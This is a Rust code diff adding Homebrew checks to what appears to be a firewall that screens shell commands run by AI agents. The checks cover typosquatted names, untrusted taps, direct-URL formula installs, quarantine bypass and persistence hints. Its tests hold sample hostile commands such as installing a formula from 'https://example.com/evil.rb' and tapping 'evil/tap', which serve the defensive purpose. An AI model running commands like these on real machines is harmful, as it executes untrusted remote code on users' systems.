@@ -134,6 +134,46 @@ impl Default for PipConfig {
     }
 }
 
+/// Homebrew ecosystem configuration for hook behaviour.
+///
+/// Loaded from the `[sentinel.homebrew]` section of the config file. When
+/// unavailable, protections default to enabled with official Homebrew taps
+/// trusted.
+#[derive(Debug, Clone)]
+#[allow(clippy::struct_excessive_bools)]
+pub struct HomebrewConfig {
+    /// Formula or cask names that skip official Homebrew API existence checks.
+    pub allowlist: Vec<String>,
+    /// Taps considered trusted for tap-qualified package installs.
+    pub trusted_taps: Vec<String>,
+    /// Warn when commands reference untrusted taps.
+    pub warn_untrusted_taps: bool,
+    /// Warn when cask quarantine is bypassed.
+    pub warn_no_quarantine: bool,
+    /// Block direct installs from URL/path formula files.
+    pub block_external_formula_installs: bool,
+    /// Warn when `brew bundle` reads a Brewfile.
+    pub warn_brewfile: bool,
+}
+
+impl Default for HomebrewConfig {
+    fn default() -> Self {
+        Self {
+            allowlist: Vec::new(),
+            trusted_taps: vec![
+                "homebrew/core".to_owned(),
+                "homebrew/cask".to_owned(),
+                "homebrew/services".to_owned(),
+                "homebrew/bundle".to_owned(),
+            ],
+            warn_untrusted_taps: true,
+            warn_no_quarantine: true,
+            block_external_formula_installs: true,
+            warn_brewfile: true,
+        }
+    }
+}
+
 /// Docker image safety configuration for hook behaviour.
 ///
 /// Loaded from the `[ai_firewall.docker]` section of the config file.
@@ -182,6 +222,8 @@ pub struct PackageManagerConfigs {
     pub cargo: CargoConfig,
     /// Python/pip ecosystem configuration.
     pub pip: PipConfig,
+    /// Homebrew ecosystem configuration.
+    pub homebrew: HomebrewConfig,
     /// Docker image safety configuration.
     pub docker: DockerConfig,
 }
@@ -204,6 +246,7 @@ pub enum Registry {
     PyPI,
     Go,
     CratesIo,
+    Homebrew,
 }
 
 impl std::fmt::Display for Registry {
@@ -213,6 +256,7 @@ impl std::fmt::Display for Registry {
             Self::PyPI => write!(f, "PyPI"),
             Self::Go => write!(f, "Go"),
             Self::CratesIo => write!(f, "crates.io"),
+            Self::Homebrew => write!(f, "Homebrew"),
         }
     }
 }
@@ -480,6 +524,15 @@ fn extract_packages_from_fragment(fragment: &str) -> Vec<(String, Registry)> {
         }
     }
 
+    // Homebrew install/reinstall/upgrade patterns. `brew upgrade` with no
+    // package args is handled separately as a broad-risk warning.
+    let homebrew_prefixes: &[&str] = &["brew install ", "brew reinstall ", "brew upgrade "];
+    for prefix in homebrew_prefixes {
+        if let Some(rest) = trimmed.strip_prefix(prefix) {
+            return parse_homebrew_args(rest);
+        }
+    }
+
     Vec::new()
 }
 
@@ -724,6 +777,68 @@ fn parse_cargo_args(args: &str) -> Vec<(String, Registry)> {
     crates
 }
 
+/// Parse formula/cask names from `brew install`, `brew reinstall`, or
+/// `brew upgrade` arguments.
+///
+/// Tap-qualified names (`owner/repo/name`) and direct URL/path formula
+/// installs are inspected by dedicated Homebrew checks and skipped here
+/// because the official formulae API only covers official formulae/casks.
+fn parse_homebrew_args(args: &str) -> Vec<(String, Registry)> {
+    const VALUE_FLAGS: &[&str] = &[
+        "--appdir",
+        "--audio-unit-plugindir",
+        "--branch",
+        "--cc",
+        "--colorpickerdir",
+        "--dictionarydir",
+        "--env",
+        "--fontdir",
+        "--input-methoddir",
+        "--internet-plugindir",
+        "--language",
+        "--mdimporterdir",
+        "--prefpanedir",
+        "--qlplugindir",
+        "--screen-saverdir",
+        "--vst-plugindir",
+        "--vst3-plugindir",
+    ];
+
+    let mut packages = Vec::new();
+    let mut skip_next = false;
+
+    for token in args.split_whitespace() {
+        if skip_next {
+            skip_next = false;
+            continue;
+        }
+
+        if token == "--" {
+            continue;
+        }
+
+        if token.starts_with('-') {
+            if token.contains('=') {
+                continue;
+            }
+            if VALUE_FLAGS.contains(&token) {
+                skip_next = true;
+            }
+            continue;
+        }
+
+        if is_homebrew_external_formula_ref(token) || homebrew_tap_from_package(token).is_some() {
+            continue;
+        }
+
+        if is_valid_homebrew_token(token) {
+            packages.push((token.to_owned(), Registry::Homebrew));
+        }
+    }
+
+    packages
+}
+
 /// Validate that a string looks like a Go module path.
 ///
 /// Go module paths must start with a domain (contain a `.` in the first
@@ -806,6 +921,45 @@ fn is_valid_crate_name(name: &str) -> bool {
         .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
 }
 
+/// Validate a Homebrew formula/cask token for API URL interpolation.
+fn is_valid_homebrew_token(name: &str) -> bool {
+    if name.is_empty() || name.len() > 256 {
+        return false;
+    }
+    if name.starts_with('.') || name.starts_with('-') || name.contains("..") {
+        return false;
+    }
+    name.bytes().all(|b| {
+        b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.' || b == b'@' || b == b'+'
+    })
+}
+
+/// Return true for direct Homebrew formula references that execute Ruby from
+/// outside the audited tap flow.
+fn is_homebrew_external_formula_ref(token: &str) -> bool {
+    token.starts_with("http://")
+        || token.starts_with("https://")
+        || token.starts_with("file://")
+        || std::path::Path::new(token)
+            .extension()
+            .is_some_and(|ext| ext.eq_ignore_ascii_case("rb"))
+        || token.starts_with("./")
+        || token.starts_with("../")
+        || token.starts_with('/')
+}
+
+/// Extract `owner/repo` from a tap-qualified Homebrew package name.
+fn homebrew_tap_from_package(token: &str) -> Option<String> {
+    let mut parts = token.split('/');
+    let owner = parts.next()?;
+    let repo = parts.next()?;
+    let formula = parts.next()?;
+    if parts.next().is_some() || owner.is_empty() || repo.is_empty() || formula.is_empty() {
+        return None;
+    }
+    Some(format!("{owner}/{repo}"))
+}
+
 /// Check whether a package exists on its registry using a synchronous HTTP
 /// HEAD request via `curl`.
 ///
@@ -832,6 +986,13 @@ fn check_package_exists_with_timeout(
                 return PackageCheckResult::CheckFailed(format!("invalid crate name: {name}"));
             }
         }
+        Registry::Homebrew => {
+            if !is_valid_homebrew_token(name) {
+                return PackageCheckResult::CheckFailed(format!(
+                    "invalid Homebrew formula/cask name: {name}"
+                ));
+            }
+        }
         _ => {
             if !is_valid_curl_package_name(name) {
                 return PackageCheckResult::CheckFailed(format!("invalid package name: {name}"));
@@ -851,10 +1012,49 @@ fn check_package_exists_with_timeout(
             let path = crate_sparse_index_path(name);
             format!("https://index.crates.io/{path}")
         }
+        Registry::Homebrew => format!("https://formulae.brew.sh/api/formula/{name}.json"),
     };
 
+    let result = curl_head_status(&url, timeout_secs);
+
+    let status = match result {
+        Ok(output) => {
+            let code = String::from_utf8_lossy(&output.stdout);
+            let code = code.trim();
+            match code {
+                "200" => return PackageCheckResult::Exists,
+                // 404 = not found, 410 = gone/retracted, 451 = legal removal (crates.io)
+                "404" | "410" | "451" => PackageCheckResult::NotFound,
+                _ => PackageCheckResult::CheckFailed(format!("registry returned HTTP {code}")),
+            }
+        }
+        Err(e) => PackageCheckResult::CheckFailed(format!("curl not available: {e}")),
+    };
+
+    if registry == &Registry::Homebrew && status == PackageCheckResult::NotFound {
+        let cask_url = format!("https://formulae.brew.sh/api/cask/{name}.json");
+        return match curl_head_status(&cask_url, timeout_secs) {
+            Ok(output) => {
+                let code = String::from_utf8_lossy(&output.stdout);
+                match code.trim() {
+                    "200" => PackageCheckResult::Exists,
+                    "404" | "410" | "451" => PackageCheckResult::NotFound,
+                    other => PackageCheckResult::CheckFailed(format!(
+                        "Homebrew cask API returned HTTP {other}"
+                    )),
+                }
+            }
+            Err(e) => PackageCheckResult::CheckFailed(format!("curl not available: {e}")),
+        };
+    }
+
+    status
+}
+
+/// Perform a bounded `curl --head` request and return the process output.
+fn curl_head_status(url: &str, timeout_secs: u64) -> std::io::Result<std::process::Output> {
     let timeout_str = timeout_secs.to_string();
-    let result = std::process::Command::new("curl")
+    std::process::Command::new("curl")
         .args([
             "-s",
             "-o",
@@ -868,23 +1068,9 @@ fn check_package_exists_with_timeout(
             "3",
             "--max-redirs",
             "0",
-            &url,
+            url,
         ])
-        .output();
-
-    match result {
-        Ok(output) => {
-            let code = String::from_utf8_lossy(&output.stdout);
-            let code = code.trim();
-            match code {
-                "200" => PackageCheckResult::Exists,
-                // 404 = not found, 410 = gone/retracted, 451 = legal removal (crates.io)
-                "404" | "410" | "451" => PackageCheckResult::NotFound,
-                _ => PackageCheckResult::CheckFailed(format!("registry returned HTTP {code}")),
-            }
-        }
-        Err(e) => PackageCheckResult::CheckFailed(format!("curl not available: {e}")),
-    }
+        .output()
 }
 
 /// Commands that only inspect file metadata (not content) and should be exempt
@@ -1896,6 +2082,147 @@ fn is_cargo_add_or_install_command(command: &str) -> bool {
     })
 }
 
+/// Homebrew commands that can introduce or execute package code.
+const HOMEBREW_COMMAND_PATTERNS: &[&str] = &[
+    "brew install ",
+    "brew reinstall ",
+    "brew upgrade ",
+    "brew tap ",
+    "brew bundle ",
+];
+
+/// Return `true` if any sub-command matches a Homebrew install/tap/bundle
+/// pattern. Uses shell splitting so chained commands are inspected.
+fn is_homebrew_command(command: &str) -> bool {
+    split_shell_commands(command).iter().any(|frag| {
+        let normalised = frag.replace('\t', " ");
+        let trimmed = normalised.trim();
+        HOMEBREW_COMMAND_PATTERNS
+            .iter()
+            .any(|pat| trimmed.starts_with(pat) || trimmed == pat.trim_end())
+    })
+}
+
+/// Extract direct URL/path formula references from Homebrew install commands.
+fn extract_homebrew_external_formula_refs(command: &str) -> Vec<String> {
+    let mut refs = Vec::new();
+    for fragment in split_shell_commands(command) {
+        let normalised = fragment.replace('\t', " ");
+        let trimmed = normalised.trim();
+        let rest = trimmed
+            .strip_prefix("brew install ")
+            .or_else(|| trimmed.strip_prefix("brew reinstall "));
+        let Some(rest) = rest else {
+            continue;
+        };
+        for token in rest.split_whitespace() {
+            if is_homebrew_external_formula_ref(token) {
+                refs.push(token.to_owned());
+            }
+        }
+    }
+    refs
+}
+
+/// Extract taps referenced by `brew tap owner/repo` commands.
+fn extract_homebrew_taps(command: &str) -> Vec<String> {
+    let mut taps = Vec::new();
+    for fragment in split_shell_commands(command) {
+        let normalised = fragment.replace('\t', " ");
+        let trimmed = normalised.trim();
+        let Some(rest) = trimmed.strip_prefix("brew tap ") else {
+            continue;
+        };
+        for token in rest.split_whitespace() {
+            if token.starts_with('-') || token.contains("://") {
+                continue;
+            }
+            if token.matches('/').count() == 1 {
+                taps.push(token.to_owned());
+                break;
+            }
+        }
+    }
+    taps
+}
+
+/// Extract explicit Git/HTTP URLs passed to `brew tap owner/repo URL`.
+fn extract_homebrew_tap_urls(command: &str) -> Vec<String> {
+    let mut urls = Vec::new();
+    for fragment in split_shell_commands(command) {
+        let normalised = fragment.replace('\t', " ");
+        let trimmed = normalised.trim();
+        let Some(rest) = trimmed.strip_prefix("brew tap ") else {
+            continue;
+        };
+        for token in rest.split_whitespace() {
+            if token.contains("://") || token.starts_with("git@") {
+                urls.push(token.to_owned());
+            }
+        }
+    }
+    urls
+}
+
+/// Extract taps from tap-qualified packages in Homebrew install/upgrade args.
+fn extract_homebrew_package_taps(command: &str) -> Vec<String> {
+    let mut taps = Vec::new();
+    for fragment in split_shell_commands(command) {
+        let normalised = fragment.replace('\t', " ");
+        let trimmed = normalised.trim();
+        let rest = trimmed
+            .strip_prefix("brew install ")
+            .or_else(|| trimmed.strip_prefix("brew reinstall "))
+            .or_else(|| trimmed.strip_prefix("brew upgrade "));
+        let Some(rest) = rest else {
+            continue;
+        };
+        for token in rest.split_whitespace() {
+            if token.starts_with('-') {
+                continue;
+            }
+            if let Some(tap) = homebrew_tap_from_package(token) {
+                taps.push(tap);
+            }
+        }
+    }
+    taps
+}
+
+/// Return true for `brew upgrade` without explicit package names.
+fn is_bare_homebrew_upgrade(command: &str) -> bool {
+    split_shell_commands(command).iter().any(|frag| {
+        let normalised = frag.replace('\t', " ");
+        let trimmed = normalised.trim();
+        let Some(rest) = trimmed.strip_prefix("brew upgrade") else {
+            return false;
+        };
+        rest.split_whitespace().all(|token| token.starts_with('-'))
+    })
+}
+
+/// Return true for `brew bundle` commands that read a Brewfile.
+fn is_homebrew_bundle_command(command: &str) -> bool {
+    split_shell_commands(command).iter().any(|frag| {
+        let normalised = frag.replace('\t', " ");
+        let trimmed = normalised.trim();
+        let Some(rest) = trimmed.strip_prefix("brew bundle") else {
+            return false;
+        };
+        let rest = rest.trim();
+        if rest.is_empty() {
+            return true;
+        }
+        for token in rest.split_whitespace() {
+            if token.starts_with('-') {
+                continue;
+            }
+            return token == "install";
+        }
+        true
+    })
+}
+
 /// Docker/Podman command patterns that may pull or run images.
 const DOCKER_COMMAND_PATTERNS: &[&str] = &[
     "docker pull ",
@@ -2235,6 +2562,7 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
     let is_pip_install = is_pip_install_command(command);
     let is_go_install = is_go_install_command(command);
     let is_cargo_add_install = is_cargo_add_or_install_command(command);
+    let is_homebrew = is_homebrew_command(command);
 
     // Read package existence check config: default to enabled with 5s timeout
     let check_pkg_existence = input
@@ -2252,7 +2580,7 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
     #[allow(clippy::useless_let_if_seq)]
     let mut pkg_warnings: Vec<String> = Vec::new();
 
-    if is_npm_install || is_pip_install || is_go_install || is_cargo_add_install {
+    if is_npm_install || is_pip_install || is_go_install || is_cargo_add_install || is_homebrew {
         let packages = extract_all_packages(command);
         let mut warnings: Vec<String> = Vec::new();
 
@@ -2269,6 +2597,7 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
                             .any(|prefix| name.starts_with(prefix.as_str()))
                 }
                 Registry::CratesIo => configs.cargo.allowlist.iter().any(|a| a == name),
+                Registry::Homebrew => configs.homebrew.allowlist.iter().any(|a| a == name),
             };
             if is_allowlisted {
                 continue;
@@ -2311,6 +2640,12 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
                              To proceed: verify at https://pypi.org/project/{name}, add to \
                              [sentinel.pip] allowlist, or run directly in your terminal"
                         ),
+                        Registry::Homebrew => format!(
+                            "Blocked: formula/cask '{name}' not found in Homebrew core/cask \
+                             (possible typosquatting/slopsquatting)\n\
+                             To proceed: verify at https://formulae.brew.sh/search?term={name}, add to \
+                             [sentinel.homebrew] allowlist, or run directly in your terminal"
+                        ),
                     };
                     return HookOutput::block(msg);
                 }
@@ -2323,6 +2658,72 @@ pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs)
                          package_check_timeout_ms in your Sanctum config."
                     ));
                 }
+            }
+        }
+
+        if is_homebrew {
+            let homebrew_config = &configs.homebrew;
+
+            if homebrew_config.block_external_formula_installs {
+                let external_refs = extract_homebrew_external_formula_refs(command);
+                if !external_refs.is_empty() {
+                    return HookOutput::block(format!(
+                        "Blocked: Homebrew install from direct formula URL/path ({}) is not permitted by policy\n\
+                         Formula files are Ruby code executed during install. Use a trusted tap, or run directly in your terminal after review.",
+                        external_refs.join(", ")
+                    ));
+                }
+            }
+
+            if homebrew_config.warn_untrusted_taps {
+                let mut taps = extract_homebrew_taps(command);
+                taps.extend(extract_homebrew_package_taps(command));
+                taps.sort();
+                taps.dedup();
+                for tap in taps {
+                    if !homebrew_config
+                        .trusted_taps
+                        .iter()
+                        .any(|trusted| trusted == &tap)
+                    {
+                        warnings.push(format!(
+                            "Warning: Homebrew tap '{tap}' is not in [sentinel.homebrew] trusted_taps. \
+                             Formulae/casks from taps can execute install and post-install code."
+                        ));
+                    }
+                }
+
+                let tap_urls = extract_homebrew_tap_urls(command);
+                for tap_url in tap_urls {
+                    warnings.push(format!(
+                        "Warning: brew tap uses explicit remote URL '{tap_url}'. \
+                         Verify the repository before trusting formulae or casks from this tap."
+                    ));
+                }
+            }
+
+            if homebrew_config.warn_no_quarantine && normalised.contains("--no-quarantine") {
+                warnings.push(
+                    "Warning: brew --no-quarantine disables macOS quarantine checks for casks. \
+                     Avoid it unless you have independently verified the app."
+                        .to_owned(),
+                );
+            }
+
+            if is_bare_homebrew_upgrade(command) {
+                warnings.push(
+                    "Warning: brew upgrade may execute formula/cask install or post-install steps \
+                     for every outdated package. Review `brew outdated` first on sensitive machines."
+                        .to_owned(),
+                );
+            }
+
+            if homebrew_config.warn_brewfile && is_homebrew_bundle_command(command) {
+                warnings.push(
+                    "Warning: brew bundle installs from a Brewfile, including taps and casks. \
+                     Review the Brewfile before running it in a trusted environment."
+                        .to_owned(),
+                );
             }
         }
 
@@ -3092,6 +3493,7 @@ const LISTENER_PATTERNS: &[&str] = &[
 /// - **systemd services**: If the command created files under `~/.config/systemd/user/`.
 /// - **Network listeners**: If the output mentions binding to a port or starting a server.
 /// - **npm lifecycle scripts**: If npm/pnpm/yarn/bun install ran (when `watch_lifecycle` is true).
+/// - **Homebrew persistence hints**: If brew output mentions post-install or service setup.
 #[must_use]
 pub fn post_bash(input: &HookInput) -> HookOutput {
     post_bash_with_npm_config(input, &NpmConfig::default())
@@ -3319,6 +3721,22 @@ pub fn post_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> H
         warnings.push(
             "npm lifecycle scripts executed during install. \
              Review postinstall/preinstall scripts for unexpected behaviour."
+                .to_owned(),
+        );
+    }
+
+    // 8. Homebrew formulae and casks can run install/post-install Ruby and
+    // install launchd/systemd persistence. Surface strong hints from output.
+    if is_homebrew_command(command)
+        && (combined_output.contains("postinstall")
+            || combined_output.contains("post-install")
+            || combined_output.contains("LaunchAgent")
+            || combined_output.contains("LaunchDaemon")
+            || combined_output.contains("brew services"))
+    {
+        warnings.push(
+            "Homebrew output suggests post-install or service/persistence setup. \
+             Verify this is expected for the formula/cask you installed."
                 .to_owned(),
         );
     }
@@ -8471,6 +8889,129 @@ mod expanded_claude_tests {
         assert_ne!(Registry::CratesIo, Registry::Npm);
     }
 
+    // --- Homebrew package manager tests ---
+
+    #[test]
+    fn registry_homebrew_display() {
+        assert_eq!(format!("{}", Registry::Homebrew), "Homebrew");
+    }
+
+    #[test]
+    fn homebrew_install_extracts_formulae_and_casks() {
+        let pkgs = extract_all_packages("brew install wget python@3.12 gtk+3");
+        assert_eq!(pkgs.len(), 3);
+        assert_eq!(pkgs[0], ("wget".to_owned(), Registry::Homebrew));
+        assert_eq!(pkgs[1], ("python@3.12".to_owned(), Registry::Homebrew));
+        assert_eq!(pkgs[2], ("gtk+3".to_owned(), Registry::Homebrew));
+    }
+
+    #[test]
+    fn homebrew_install_skips_tapped_and_external_refs_for_api_check() {
+        let pkgs = extract_all_packages(
+            "brew install homebrew/cask/google-chrome https://example.com/evil.rb ./local.rb",
+        );
+        assert!(pkgs.is_empty());
+    }
+
+    #[test]
+    fn homebrew_command_detects_chained_install() {
+        assert!(is_homebrew_command("cd /tmp && brew install wget"));
+        assert!(is_homebrew_command("brew tap evil/tap"));
+        assert!(is_homebrew_command("brew bundle install"));
+        assert!(!is_homebrew_command("brew list"));
+    }
+
+    #[test]
+    fn homebrew_untrusted_tap_warns() {
+        let mut input = bash_input("brew tap evil/tap");
+        input.config = Some(sanctum_types::config::AiFirewallConfig {
+            check_package_existence: false,
+            ..sanctum_types::config::AiFirewallConfig::default()
+        });
+        let output = pre_bash_with_configs(&input, &PackageManagerConfigs::default());
+        assert_eq!(output.decision, HookDecision::Warn);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("evil/tap"));
+        assert!(msg.contains("trusted_taps"));
+    }
+
+    #[test]
+    fn homebrew_tap_custom_url_warns() {
+        let mut input = bash_input("brew tap homebrew/core https://example.com/homebrew-core.git");
+        input.config = Some(sanctum_types::config::AiFirewallConfig {
+            check_package_existence: false,
+            ..sanctum_types::config::AiFirewallConfig::default()
+        });
+        let output = pre_bash_with_configs(&input, &PackageManagerConfigs::default());
+        assert_eq!(output.decision, HookDecision::Warn);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("explicit remote URL"));
+    }
+
+    #[test]
+    fn homebrew_external_formula_install_blocks() {
+        let output = pre_bash_with_configs(
+            &bash_input("brew install https://example.com/evil.rb"),
+            &PackageManagerConfigs::default(),
+        );
+        assert_eq!(output.decision, HookDecision::Block);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("direct formula URL/path"));
+    }
+
+    #[test]
+    fn homebrew_no_quarantine_warns() {
+        let mut input = bash_input("brew install --cask --no-quarantine google-chrome");
+        input.config = Some(sanctum_types::config::AiFirewallConfig {
+            check_package_existence: false,
+            ..sanctum_types::config::AiFirewallConfig::default()
+        });
+        let output = pre_bash_with_configs(&input, &PackageManagerConfigs::default());
+        assert_eq!(output.decision, HookDecision::Warn);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("--no-quarantine"));
+    }
+
+    #[test]
+    fn homebrew_bundle_warns() {
+        let mut input = bash_input("brew bundle install");
+        input.config = Some(sanctum_types::config::AiFirewallConfig {
+            check_package_existence: false,
+            ..sanctum_types::config::AiFirewallConfig::default()
+        });
+        let output = pre_bash_with_configs(&input, &PackageManagerConfigs::default());
+        assert_eq!(output.decision, HookDecision::Warn);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("Brewfile"));
+    }
+
+    #[test]
+    fn homebrew_bundle_dump_does_not_warn_as_install() {
+        let mut input = bash_input("brew bundle dump");
+        input.config = Some(sanctum_types::config::AiFirewallConfig {
+            check_package_existence: false,
+            ..sanctum_types::config::AiFirewallConfig::default()
+        });
+        let output = pre_bash_with_configs(&input, &PackageManagerConfigs::default());
+        assert_eq!(output.decision, HookDecision::Allow);
+    }
+
+    #[test]
+    fn post_bash_homebrew_persistence_output_warns() {
+        let input = make_test_input(
+            "bash",
+            json!({
+                "command": "brew install postgresql",
+                "stdout": "==> Caveats\nTo start now and restart at login: brew services start postgresql",
+                "stderr": ""
+            }),
+        );
+        let output = post_bash_with_configs(&input, &PackageManagerConfigs::default());
+        assert_eq!(output.decision, HookDecision::Warn);
+        let msg = output.message.as_deref().unwrap_or("");
+        assert!(msg.contains("Homebrew output"));
+    }
+
     // --- Docker image extraction tests ---
 
     #[test]
@@ -8849,7 +9390,14 @@ mod expanded_claude_tests {
         assert!(configs.npm.ignore_scripts_warning);
         assert!(configs.pip.warn_source_installs);
         assert!(configs.cargo.warn_build_scripts);
+        assert!(configs.homebrew.warn_untrusted_taps);
+        assert!(configs.homebrew.warn_no_quarantine);
+        assert!(configs.homebrew.block_external_formula_installs);
         assert!(configs.docker.warn_latest);
+        assert!(configs
+            .homebrew
+            .trusted_taps
+            .contains(&"homebrew/core".to_owned()));
         assert_eq!(configs.docker.trusted_registries.len(), 5);
     }
 
